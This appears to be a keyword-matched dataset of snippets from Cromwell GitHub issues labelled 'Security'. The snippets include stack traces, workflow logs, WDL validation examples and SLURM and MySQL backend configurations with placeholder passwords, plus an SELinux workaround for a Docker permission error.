Paste/Attach your workflow if possible: -->.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3927:5334,validat,validation,5334,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3927,1,['validat'],['validation']
Security,ctorCell.scala:521); 	at akka.actor.ActorCell.systemInvoke(ActorCell.scala:545); 	at akka.dispatch.Mailbox.processAllSystemMessages(Mailbox.scala:283); 	at akka.dispatch.Mailbox.run(Mailbox.scala:224); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:235); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: cromwell.backend.validation.ValidatedRuntimeAttributesBuilder$$anon$1: Runtime attribute validation failed:; Expecting cpu runtime attribute value greater than 0; Expecting cpuMin runtime attribute value greater than 0; 	at cromwell.backend.validation.ValidatedRuntimeAttributesBuilder.build(ValidatedRuntimeAttributesBuilder.scala:62); 	at cromwell.backend.validation.ValidatedRuntimeAttributesBuilder.build$(ValidatedRuntimeAttributesBuilder.scala:56); 	at cromwell.backend.standard.StandardValidatedRuntimeAttributesBuilder$StandardValidatedRuntimeAttributesBuilderImpl.build(StandardValidatedRuntimeAttributesBuilder.scala:20); 	at cromwell.backend.standard.StandardCachingActorHelper.validatedRuntimeAttributes(StandardCachingActorHelper.scala:56); 	at cromwell.backend.standard.StandardCachingActorHelper.validatedRuntimeAttributes$(StandardCachingActorHelper.scala:54); 	at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.validatedRuntimeAttributes$lzycompute(AwsBatchAsyncBackendJobExecutionActor.scala:74); 	at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.validatedRuntimeAttributes(AwsBatchAsyncBackendJobExecutionActor.scala:74); 	at cromwell.backend.standard.StandardCachingActorHelper.startMetadataKeyValues(StandardCachingActorHelper.scala:75); 	at cromwell.backend.standard.StandardCachingActorHelper.startMetadataKeyValues$(StandardCachingActorHelper.scala:74); 	at cromwel,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4591:6166,Validat,ValidatedRuntimeAttributesBuilder,6166,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4591,1,['Validat'],['ValidatedRuntimeAttributesBuilder']
Security,"ctorFactory""; config {; runtime-attributes = """"""; String userid; String partitions; String memory_per_node; Int nodes; Int cores; String time; """""". # If an 'exit-code-timeout-seconds' value is specified:; # - When a job has not been alive for longer than this timeout; # - And has still not produced an RC file; # - Then it will be marked as Failed.; # Warning: If set, Cromwell has to run 'check-alive' for every job at regular intervals (unrelated to this timeout). exit-code-timeout-seconds = 600. submit = """"""; chmod 770 -R ${cwd}; sudo change-files.sh ${userid} ${cwd}; phoenix_home_cwd=""/home/${userid}""; phoenix_home_out=""/home/${userid}/stdout""; phoenix_home_err=""/home/${userid}/stderr"". phoenix_script=${script}_phonix; cat ${script} | sed -s ""s@#\!/bin/bash@#\!/bin/bash\nsource '/etc/profile' @g"" > $phoenix_script. sbatch --uid=${userid} --gid=${userid} \; -J ${job_name} \; -p ${partitions} \; -N ${nodes} \; -n ${cores} \; --mem=${memory_per_node} \; --time=${time} \; -D $phoenix_home_cwd \; -o $phoenix_home_out \; -e $phoenix_home_err \; $phoenix_script; """""". kill = ""scancel ${job_id}""; check-alive = ""squeue -j ${job_id}""; job-id-regex = ""Submitted batch job (\\d+).*"". root = ""/fast/gdr/uat/cromwell-executions""; }; }. } # providers. } # backend. # https://gatkforums.broadinstitute.org/wdl/discussion/9536/how-do-i-set-up-a-mysql-database-for-cromwell; # http://slick.lightbend.com/doc/3.2.0/api/index.html#slick.jdbc.JdbcBackend$DatabaseFactoryDef@forConfig(String,Config,Driver):Database. database {; profile = ""slick.jdbc.MySQLProfile$""; db {; driver = ""com.mysql.jdbc.Driver""; url = ""jdbc:mysql://gdr-cromwell-uat-URL/uat_gdr_cromwell?rewriteBatchedStatements=true""; user = ""uat_gdr_cromwell""; password = ""<<cromwell_mysql_password>>""; connectionTimeout = 15000; }; }. system {; abort-jobs-on-terminate = false; max-concurrent-workflows = 1000; new-workflow-poll-rate = 2; max-workflow-launch-count = 50; }. # helpful links; # https://devhub.io/repos/broadinstitute-cromwell",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4404:3241,password,password,3241,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4404,1,['password'],['password']
Security,"cwl/tools/picard_collectoxogmetrics_to_sqlite.cwl; [2018-09-14 13:21:49,69] [info] Pre-Processing /home/jeremiah/gdc-dnaseq-cwl/tools/picard_collectwgsmetrics.cwl; [2018-09-14 13:21:49,78] [info] Pre-Processing /home/jeremiah/gdc-dnaseq-cwl/tools/picard_collectwgsmetrics_to_sqlite.cwl; [2018-09-14 13:21:49,87] [info] Pre-Processing /home/jeremiah/gdc-dnaseq-cwl/tools/samtools_flagstat.cwl; [2018-09-14 13:21:49,94] [info] Pre-Processing /home/jeremiah/gdc-dnaseq-cwl/tools/samtools_flagstat_to_sqlite.cwl; [2018-09-14 13:21:50,02] [info] Pre-Processing /home/jeremiah/gdc-dnaseq-cwl/tools/samtools_idxstats.cwl; [2018-09-14 13:21:50,08] [info] Pre-Processing /home/jeremiah/gdc-dnaseq-cwl/tools/samtools_idxstats_to_sqlite.cwl; [2018-09-14 13:21:50,17] [info] Pre-Processing /home/jeremiah/gdc-dnaseq-cwl/tools/samtools_stats.cwl; [2018-09-14 13:21:50,38] [info] Pre-Processing /home/jeremiah/gdc-dnaseq-cwl/tools/samtools_stats_to_sqlite.cwl; [2018-09-14 13:21:50,46] [info] Pre-Processing /home/jeremiah/gdc-dnaseq-cwl/workflows/bamfastq_align/integrity.cwl; [2018-09-14 13:21:50,64] [info] Pre-Processing /home/jeremiah/gdc-dnaseq-cwl/tools/ls_l.cwl; [2018-09-14 13:21:50,71] [info] Pre-Processing /home/jeremiah/gdc-dnaseq-cwl/tools/md5sum.cwl; [2018-09-14 13:21:50,81] [info] Pre-Processing /home/jeremiah/gdc-dnaseq-cwl/tools/sha256sum.cwl; [2018-09-14 13:21:50,87] [info] Pre-Processing /home/jeremiah/gdc-dnaseq-cwl/tools/integrity_to_sqlite.cwl; [2018-09-14 13:21:51,02] [info] Pre Processing Inputs...; [2018-09-14 13:21:51,27] [info] Workflow heartbeat configuration:; {; ""cromwellId"" : ""cromid-6d01716"",; ""heartbeatInterval"" : ""2 minutes"",; ""ttl"" : ""10 minutes"",; ""writeBatchSize"" : 10000,; ""writeThreshold"" : 10000; }; [2018-09-14 13:21:51,38] [info] Metadata summary refreshing every 2 seconds.; [2018-09-14 13:21:51,44] [info] WriteMetadataActor configured to flush with batch size 200 and process rate 5 seconds.; [2018-09-14 13:21:51,45] [info] KvWriteActor configured to flush wit",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4103:18647,integrity,integrity,18647,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4103,1,['integrity'],['integrity']
Security,"d = ""/etc""; }; }' > main.wdl; ```; Will fail the womtool parser:; ```; $ java -jar womtool-67.jar validate main.wdl; Failed to process workflow definition 'main' (reason 1 of 1): Failed to process input declaration 'Directory d = ""/etc""' (reason 1 of 1): Cannot coerce expression of type 'String' to 'Directory'; ```; Despite [coercion](https://github.com/openwdl/wdl/blob/main/versions/development/SPEC.md#type-coercion) from `String` to `Directory` being allowed by the WDL specification and this being among the examples (see [here](https://github.com/openwdl/wdl/blob/main/versions/development/SPEC.md#task-inputs) and [here](https://github.com/openwdl/wdl/blob/main/versions/development/SPEC.md#primitive-types)). Surprisingly, you can coerce a `String` into a `Directory` if it comes from an input file:; ```; $ echo 'version development. workflow main {; input {; Directory d; }; }' > main.wdl. $ echo '{; ""main.d"": ""/etc""; }' > main.json; ```; And then:; ```; $ java -jar womtool-67.jar validate main.wdl -i main.json; Success!; ```. Also puzzling is the following:; ```; $ echo 'version development. workflow main {; input {; Directory d; }; String s = sub(d, ""x"", ""y""); }' > main.wdl; ```; And then:; ```; $ java -jar womtool-67.jar validate main.wdl; Failed to process workflow definition 'main' (reason 1 of 1): Failed to process declaration 'String s = sub(d, ""x"", ""y"")' (reason 1 of 1): Failed to process expression 'sub(d, ""x"", ""y"")' (reason 1 of 1): Invalid parameter 'IdentifierLookup(d)'. Expected 'File' but got 'Directory'; ```; First of all, it is unclear why womtool claims sub expects a `File`, as the definition of [sub](https://github.com/openwdl/wdl/blob/main/versions/development/SPEC.md#string-substring-string-string) is `String sub(String, String, String)` so `File` is not something that should be expected. Here it should be allowed to coerce `Directory` to `String` the same way as it is allowed to coerce `File` to `String`:; ```; $ echo 'version development. workfl",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6501#issuecomment-925057228:1098,validat,validate,1098,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6501#issuecomment-925057228,1,['validat'],['validate']
Security,"d(classpath(""application"")). webservice {; }. akka {; http {; server {; }; }; }. system {; io {; }; input-read-limits {; }; job-rate-control {; jobs = 2; per = 1 second; }. abort {; scan-frequency: 30 seconds; cache {; enabled: true; concurrency: 1; ttl: 20 minutes; size: 100000; }; }. dns-cache-ttl: 3 minutes; }. workflow-options {; default {; }; }. call-caching {; enabled = true; }. google {; }. docker {; hash-lookup {; }; }. engine {; filesystems {; local {; }; }; }. languages {; WDL {; versions {; ""draft-2"" {; }; ""1.0"" {; }; }; }; CWL {; versions {; ""v1.0"" {; }; }; }; }. backend {; default = ""SLURM"". providers {. SLURM {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; concurrent-job-limit = 500; runtime-attributes = """"""; Int runtime_minutes = 720; Int cpus = 1; Int requested_memory_mb_per_core = 8000; String queue = ""short""; """""". exit-code-timeout-seconds = 600. submit = """"""; sbatch -J ${job_name} -D ${cwd} -o ${out} -e ${err} -t ${runtime_minutes} -p ${queue} \; ${""-n "" + cpus} \; --mem-per-cpu=${requested_memory_mb_per_core} \; --constraint=""groups"" \; --qos=ded_reich \; --account=""reich"" \; --wrap ""/usr/bin/env bash ${script}""; """"""; kill = ""scancel ${job_id}""; check-alive = ""squeue -j ${job_id}""; job-id-regex = ""Submitted batch job (\\d+).*"". filesystems {; local {; localization: [; ""hard-link"", ""soft-link"", ""copy""; ]. caching {; duplication-strategy: [; ""soft-link""; ]. hashing-strategy: ""path"". check-sibling-md5: false; }; }; }. default-runtime-attributes {; failOnStderr: false; continueOnReturnCode: 0; }; }; }; }; }. services {; MetadataService {; }. Instrumentation {; }; HealthMonitor {; config {; }; }; LoadController {; config {; }; }; }. database {; driver = ""slick.jdbc.MySQLProfile$"". db {; driver = ""com.mysql.cj.jdbc.Driver""; url = ""jdbc:mysql://database.host/callcachingdatabase?rewriteBatchedStatements=true""; user = ${USER}; password = ${MYSQL_DB_PW}; connectionTimeout = 5000; }. migration {; }; }. ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6929:3814,hash,hashing-strategy,3814,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6929,2,"['hash', 'password']","['hashing-strategy', 'password']"
Security,"d): 'main.kinship_count' (scatter index: None, attempt 1); [2022-12-15 21:22:59,78] [info] WorkflowExecutionActor-9e4f5894-f7e6-4e2f-be4b-f547d6de7fff [9e4f5894]: Job results retrieved (CallCached): 'main.reported_sex' (scatter index: None, attempt 1); [2022-12-15 21:22:59,78] [info] WorkflowExecutionActor-9e4f5894-f7e6-4e2f-be4b-f547d6de7fff [9e4f5894]: Job results retrieved (CallCached): 'main.sex_aneuploidy' (scatter index: None, attempt 1); [2022-12-15 21:22:59,78] [info] WorkflowExecutionActor-9e4f5894-f7e6-4e2f-be4b-f547d6de7fff [9e4f5894]: Job results retrieved (CallCached): 'main.month_of_birth' (scatter index: None, attempt 1); [2022-12-15 21:22:59,84] [warn] 9e4f5894-f7e6-4e2f-be4b-f547d6de7fff-BackendCacheHitCopyingActor-9e4f5894:main.year_of_birth:-1:1-20000000028 [9e4f5894main.year_of_birth:NA:1]: Unrecognized runtime attribute keys: dx_timeout; [2022-12-15 21:22:59,84] [info] BT-322 9e4f5894:main.year_of_birth:-1:1 cache hit copying success with aggregated hashes: initial = 09247459DDA5EA8DF661D5F490C81E8B, file = EF056BD27B3A512F77663A400D778CCF.; [2022-12-15 21:22:59,84] [info] 9e4f5894-f7e6-4e2f-be4b-f547d6de7fff-EngineJobExecutionActor-main.year_of_birth:NA:1 [9e4f5894]: Call cache hit process had 0 total hit failures before completing successfully; [2022-12-15 21:23:00,36] [warn] 9e4f5894-f7e6-4e2f-be4b-f547d6de7fff-BackendCacheHitCopyingActor-9e4f5894:main.phenotype:-1:1-20000000025 [9e4f5894main.phenotype:NA:1]: Unrecognized runtime attribute keys: dx_timeout; [2022-12-15 21:23:00,36] [info] BT-322 9e4f5894:main.phenotype:-1:1 cache hit copying success with aggregated hashes: initial = 018D1BC619E22671C2125EEDE82AB210, file = EF056BD27B3A512F77663A400D778CCF.; [2022-12-15 21:23:00,36] [info] 9e4f5894-f7e6-4e2f-be4b-f547d6de7fff-EngineJobExecutionActor-main.phenotype:NA:1 [9e4f5894]: Call cache hit process had 0 total hit failures before completing successfully; [2022-12-15 21:23:00,37] [warn] 9e4f5894-f7e6-4e2f-be4b-f547d6de7fff-BackendCacheHitCo",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6971:24991,hash,hashes,24991,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6971,1,['hash'],['hashes']
Security,"d.standard.callcaching.StandardFileHashingActor.akka$actor$Timers$$super$aroundReceive(StandardFileHashingActor.scala:59); 	at akka.actor.Timers.aroundReceive(Timers.scala:44); 	at akka.actor.Timers.aroundReceive$(Timers.scala:36); 	at cromwell.backend.standard.callcaching.StandardFileHashingActor.aroundReceive(StandardFileHashingActor.scala:59); 	at akka.actor.ActorCell.receiveMessage(ActorCell.scala:527); 	at akka.actor.ActorCell.invoke(ActorCell.scala:496); 	at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); 	at akka.dispatch.Mailbox.run(Mailbox.scala:224); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:234); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); [2018-05-02 15:22:54,71] [[38;5;1merror[0m] bc4644da:batch_for_variantcall:-1:1: Hash error, disabling call caching for this job.; java.io.FileNotFoundException: Cannot hash file null because it can't be found; 	at cromwell.backend.impl.sfs.config.ConfigHashingStrategy.usingStandardInitData$1(ConfigHashingStrategy.scala:46); 	at cromwell.backend.impl.sfs.config.ConfigHashingStrategy.getHash(ConfigHashingStrategy.scala:57); 	at cromwell.backend.impl.sfs.config.ConfigBackendFileHashingActor.customHashStrategy(ConfigBackendFileHashingActor.scala:26); 	at cromwell.backend.standard.callcaching.StandardFileHashingActor$$anonfun$fileHashingReceive$1.applyOrElse(StandardFileHashingActor.scala:79); 	at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:172); 	at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:172); 	at akka.actor.Actor.aroundReceive(Actor.scala:514); 	at akka.actor.Actor.aroundReceive$(Actor.scala:512); 	at cromwell.backend.standard.callcaching.StandardFileHashingActor.akka$actor$Timers$$super$aroundReceive(",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3584:6704,Hash,Hash,6704,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3584,1,['Hash'],['Hash']
Security,"d18a728dfc5 /cromwell-executions/HelloWorldWithDocker/3d200d74-77eb-45d8-8fe6-b41b14aab6f6/call-WriteGreeting/execution/script; Hello Docker; +++ cat /home/jaruga/git/dockstore-cli-docker-test/cromwell-executions/HelloWorldWithDocker/3d200d74-77eb-45d8-8fe6-b41b14aab6f6/call-WriteGreeting/execution/docker_cid; ++ docker wait 56df02a84010fae2573793c374e4ae3c506dc5c9a759169d09c378d0dcdfaa0d; + rc=0; ++ cat /home/jaruga/git/dockstore-cli-docker-test/cromwell-executions/HelloWorldWithDocker/3d200d74-77eb-45d8-8fe6-b41b14aab6f6/call-WriteGreeting/execution/docker_cid; + docker rm 56df02a84010fae2573793c374e4ae3c506dc5c9a759169d09c378d0dcdfaa0d; 56df02a84010fae2573793c374e4ae3c506dc5c9a759169d09c378d0dcdfaa0d; + exit 0; ```. ## Workaround. I was able to suppress this error by disabling SE Linux on Fedora 36. But this is not an ideal way. Because I think SE Linux is enabled (Current mode: enforcing) as a default on RPM-based distributions such as Fedora, RHEL, CentOS stream and etc for security reasons. ```; $ sestatus ; SELinux status: enabled; SELinuxfs mount: /sys/fs/selinux; SELinux root directory: /etc/selinux; Loaded policy name: targeted; Current mode: enforcing; Mode from config file: enforcing; Policy MLS status: enabled; Policy deny_unknown status: allowed; Memory protection checking: actual (secure); Max kernel policy version: 33; ```. Disabled like this. ```; $ sudo setenforce 0. $ sestatus; SELinux status: enabled; SELinuxfs mount: /sys/fs/selinux; SELinux root directory: /etc/selinux; Loaded policy name: targeted; Current mode: permissive; Mode from config file: enforcing; Policy MLS status: enabled; Policy deny_unknown status: allowed; Memory protection checking: actual (secure); Max kernel policy version: 33; ```. I think you can try [SE Linux on Ubuntu](https://wiki.ubuntu.com/SELinux) to reproduce this error if you only have Debian-based Linux. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6905:8070,secur,secure,8070,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6905,3,"['PASSWORD', 'secur']","['PASSWORDS', 'secure']"
Security,"dBwaMem/inputs/-1845554049/test:; doesn't exist; Cannot localize directory with symbolic links; /nfs/disk3/user/gaoyuhui/github/test/cromwell-executions/PreProcessingForVariantDiscovery_GATK4/8fc94dc1-722b-40d5-9840-9d6e4a66db21/call-SamToFastqAndBwaMem/inputs/-1845554049/test -> /nfs/disk3/user/gaoyuhui/github/test: Operation not permitted. 2：; ...; ...; amToFastqAndBwaMem/inputs/-1845554049/test.tmp/cromwell-executions/PreProcessingForVariantDiscovery_GATK4/8fc94dc1-722b-40d5-9840-9d6e4a66db21/call-SamToFastqAndBwaMem/inputs/-1845554049/test.tmp/cromwell-executions/PreProcessingForVariantDiscovery_GATK4/8fc94dc1-722b-40d5-9840-9d6e4a66db21/call-SamToFastqAndBwaMem/inputs/-1845554049/test.tmp/cromwell-executions/PreProcessingForVariantDiscovery_GATK4/8fc94dc1-722b-40d5-9840-9d6e4a66db21/call-SamToFastqAndBwaMem/inputs/-1845554049/test.tmp/cromwell-executions/PreProcessingForVariantDiscovery_GATK4/8fc94dc1-722b-40d5-9840-9d6e4a66db21/call-SamToFastqAndBwaMem/inputs/-1845554049/test.tmp/cromwell-executions/PreProcessingForVariantDiscovery_GATK4/8fc94dc1-722b-40d5-9840-9d6e4a66db21/call-SamToFastqAndBwaMem/inputs/-1845554049/test.tmp/cromwell-workflow-logs/workflow.8fc94dc1-722b-40d5-9840-9d6e4a66db21.log: File name too long; at common.validation.Validation$ValidationTry$.toTry$extension1(Validation.scala:68); at common.validation.Validation$ValidationTry$.toTry$extension0(Validation.scala:64); at cromwell.backend.standard.StandardAsyncExecutionActor.instantiatedCommand(StandardAsyncExecutionActor.scala:563); ... 32 common frames omitted. cromwell: v36.1; my working dir is: /nfs/disk3/user/gaoyuhui/github/test, has only 2.wdl and 2.json for test, but everytime this simple task is getting recursive and finally file name too long, and when change backend to local, it is the same. I found other topic and change to other dir to run this wdl task, got the same error.; so, can someone check about this? How can I goes well. it is a bug or my mistake??; Yours, sincerely!; Gao",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4703:2933,validat,validation,2933,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4703,8,"['Validat', 'validat']","['Validation', 'ValidationTry', 'validation']"
Security,"dBy: [ ],; message: ""wdl.Scope.childGraphNodesSorted$(Scope.scala:43)""; },; {; causedBy: [ ],; message: ""wdl.WdlWorkflow.childGraphNodesSorted$lzycompute(WdlWorkflow.scala:63)""; },; {; causedBy: [ ],; message: ""wdl.WdlWorkflow.childGraphNodesSorted(WdlWorkflow.scala:63)""; },; {; causedBy: [ ],; message: ""wdl.WdlGraphNode$.buildWomGraph(WdlGraphNode.scala:140)""; },; {; causedBy: [ ],; message: ""wdl.WdlWorkflow$.womWorkflowDefinition(WdlWorkflow.scala:52)""; },; {; causedBy: [ ],; message: ""wdl.WdlWorkflow.womDefinition$lzycompute(WdlWorkflow.scala:73)""; },; {; causedBy: [ ],; message: ""wdl.WdlWorkflow.womDefinition(WdlWorkflow.scala:73)""; },; {; causedBy: [ ],; message: ""wdl.WdlInputParsing$.buildWomExecutable(WdlInputParsing.scala:27)""; },; {; causedBy: [ ],; message: ""wdl.WdlNamespaceWithWorkflow.womExecutable(WdlNamespace.scala:98)""; },; {; causedBy: [ ],; message: ""cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor.$anonfun$validateWdlNamespace$15(MaterializeWorkflowDescriptorActor.scala:493)""; },; {; causedBy: [ ],; message: ""scala.util.Either.flatMap(Either.scala:338)""; },; {; causedBy: [ ],; message: ""cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor.$anonfun$validateWdlNamespace$13(MaterializeWorkflowDescriptorActor.scala:491)""; },; {; causedBy: [ ],; message: ""scala.util.Either.flatMap(Either.scala:338)""; },; {; causedBy: [ ],; message: ""cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor.validateWdlNamespace(MaterializeWorkflowDescriptorActor.scala:490)""; },; {; causedBy: [ ],; message: ""cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor.cromwell$engine$workflow$lifecycle$materialization$MaterializeWorkflowDescriptorActor$$buildWorkflowDescriptor(MaterializeWorkflowDescriptorActor.scala:231)""; },; {; causedBy: [ ],; message: ""cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anonfun$1",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3143:1355,validat,validateWdlNamespace,1355,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3143,1,['validat'],['validateWdlNamespace']
Security,dJobExecutionActor$$anonfun$executionResult$1.apply(JesAsyncBackendJobExecutionActor.scala:549); at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor$$anonfun$executionResult$1.apply(JesAsyncBackendJobExecutionActor.scala:539); at scala.concurrent.impl.Future$PromiseCompletingRunnable.liftedTree1$1(Future.scala:24); at scala.concurrent.impl.Future$PromiseCompletingRunnable.run(Future.scala:24); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:415); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: javax.net.ssl.SSLHandshakeException: Remote host closed connection during handshake; at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:980); at sun.security.ssl.SSLSocketImpl.performInitialHandshake(SSLSocketImpl.java:1363); at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1391); at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1375); at sun.net.www.protocol.https.HttpsClient.afterConnect(HttpsClient.java:563); at sun.net.www.protocol.https.AbstractDelegateHttpsURLConnection.connect(AbstractDelegateHttpsURLConnection.java:185); at sun.net.www.protocol.https.HttpsURLConnectionImpl.connect(HttpsURLConnectionImpl.java:153); at com.google.api.client.http.javanet.NetHttpRequest.execute(NetHttpRequest.java:93); at com.google.api.client.http.HttpRequest.execute(HttpRequest.java:981); at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:419); at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:352); a,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1782:4024,secur,security,4024,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1782,1,['secur'],['security']
Security,"default supervision strategy with ""restart on generic Exception"" is being used. Simply restarting a crashed `WorkflowActor` FSM appears to put it back into its initial `WorkflowUnstartedState` where it wouldn't do anything to progress a workflow until it receives a `StartWorkflowCommand` which is not being re-sent. So it looks like this would create a zombie workflow, though it does appear to be abortable.; ```; ERROR akka.actor.OneForOneStrategy - Google credentials are invalid: Error getting access token for service account: 400 Bad Request; {; ""error"": ""invalid_grant"",; ""error_description"": ""Invalid JWT Signature.""; }; java.lang.RuntimeException: Google credentials are invalid: Error getting access token for service account: 400 Bad Request; {; ""error"": ""invalid_grant"",; ""error_description"": ""Invalid JWT Signature.""; }; 	at cromwell.cloudsupport.gcp.auth.GoogleAuthMode.validateCredentials(GoogleAuthMode.scala:175); 	at cromwell.cloudsupport.gcp.auth.GoogleAuthMode.validateCredentials$(GoogleAuthMode.scala:173); 	at cromwell.cloudsupport.gcp.auth.UserServiceAccountMode.validateCredentials(GoogleAuthMode.scala:237); 	at cromwell.cloudsupport.gcp.auth.UserServiceAccountMode.credentials(GoogleAuthMode.scala:250); 	at cromwell.cloudsupport.gcp.auth.UserServiceAccountMode.credentials(GoogleAuthMode.scala:237); 	at cromwell.filesystems.drs.DrsPathBuilderFactory.withOptions(DrsPathBuilderFactory.scala:86); 	at cromwell.core.path.PathBuilderFactory$.$anonfun$instantiatePathBuilders$2(PathBuilderFactory.scala:23); 	at cats.instances.ListInstances$$anon$1.$anonfun$traverse$2(list.scala:74); 	at cats.instances.ListInstances$$anon$1.loop$2(list.scala:64); 	at cats.instances.ListInstances$$anon$1.$anonfun$foldRight$1(list.scala:64); 	at cats.Eval$$anon$11.$anonfun$start$3(Eval.scala:275); 	at cats.Eval$.loop$1(Eval.scala:336); 	at cats.Eval$.cats$Eval$$evaluate(Eval.scala:368); 	at cats.Eval$Defer.value(Eval.scala:257); 	at cats.instances.ListInstances$$anon$1.traverse(list.sc",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4916:1060,validat,validateCredentials,1060,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4916,1,['validat'],['validateCredentials']
Security,denied; ; 04:26:11; /bin/bash: line 52: /cromwell_root/glob-560912e697c3494360223c7ca65aa3e8/cromwell_glob_control_file: No such file or directory; ; 04:26:11; ln: failed to access '/cromwell_root/*.qcstats': No such file or directory; ; 04:26:11; /bin/bash: line 58: /cromwell_root/glob-560912e697c3494360223c7ca65aa3e8.list: Permission denied; ; 04:26:11; ls: cannot access '/cromwell_root/glob-560912e697c3494360223c7ca65aa3e8': No such file or directory; ; 04:26:11; mkdir: cannot create directory '/cromwell_root/glob-b34dfc006a981a93d6da067cf50036fe': Permission denied; ; 04:26:11; /bin/bash: line 66: /cromwell_root/glob-b34dfc006a981a93d6da067cf50036fe/cromwell_glob_control_file: No such file or directory; ; 04:26:11; ln: failed to access '/cromwell_root/cwl.output.json': No such file or directory; ; 04:26:11; /bin/bash: line 72: /cromwell_root/glob-b34dfc006a981a93d6da067cf50036fe.list: Permission denied; ; 04:26:11; ls: cannot access '/cromwell_root/glob-b34dfc006a981a93d6da067cf50036fe': No such file or directory; ; 04:26:11; mv: cannot stat '/cromwell_root/bbmap-rc.txt.tmp': No such file or directory; ; 04:26:11; MIME-Version: 1.0; ; 04:26:11; Content-Type: multipart/alternative; boundary=278185423cec5467d351ab751807c36a; ; 04:26:11; --278185423cec5467d351ab751807c36a; ; 04:26:11; Content-Type: text/plain; ; 04:26:11; Content-Disposition: attachment; filename=rc.txt; ; 04:26:11; cat: /cromwell_root/bbmap-rc.txt: No such file or directory; ; 04:26:11; --278185423cec5467d351ab751807c36a; ; 04:26:11; Content-Type: text/plain; ; 04:26:11; Content-Disposition: attachment; filename=stdout.txt; ; 04:26:11; cat: /cromwell_root/bbmap-stdout.log: No such file or directory; ; 04:26:11; --278185423cec5467d351ab751807c36a; ; 04:26:11; Content-Type: text/plain; ; 04:26:11; Content-Disposition: attachment; filename=stderr.txt; ; 04:26:11; cat: /cromwell_root/DA0000317_WSU-DLCL.qcstats: No such file or directory; ; 04:26:11; 